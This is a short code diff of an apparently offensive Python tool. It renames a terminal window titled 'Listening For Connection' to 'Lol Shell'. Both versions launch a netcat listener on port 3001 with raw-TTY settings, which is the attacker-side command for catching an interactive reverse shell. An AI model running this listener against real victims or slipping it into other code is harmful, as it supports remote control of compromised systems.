@@ -35,7 +35,7 @@ if choice == 'Y':
 
 elif choice == 'y':
     print("ok")
-    os.system("xterm -T 'Listening For Connection' -fa monaco -fs 13 -bg black -e 'stty raw -echo; (stty size; cat) | nc -lvnp 3001'")
+    os.system("xterm -T 'Lol Shell' -fa monaco -fs 13 -bg black -e 'stty raw -echo; (stty size; cat) | nc -lvnp 3001'")
 
 else:
     exit()
